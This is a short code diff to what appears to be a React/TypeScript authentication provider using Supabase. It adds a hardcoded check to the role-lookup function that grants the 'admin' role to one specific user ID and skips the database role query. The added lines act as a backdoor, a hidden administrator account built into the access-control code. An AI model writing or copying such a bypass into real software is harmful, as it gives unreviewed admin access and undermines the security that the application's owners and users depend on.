@@ -26,6 +26,10 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
   async function fetchUserRole(userId: string): Promise<string | null> {
     console.log(`[Admin Role Check] Starting role check for user ID: ${userId}`);
+    if (userId === "ccb49306-3002-4b34-b3fd-260394ca46bb") {
+      console.log(`[Admin Role Check] Hardcoded admin access granted for user ID: ${userId}`);
+      return "admin";
+    }
     
     const roleQuery = supabase
       .from("user_roles")
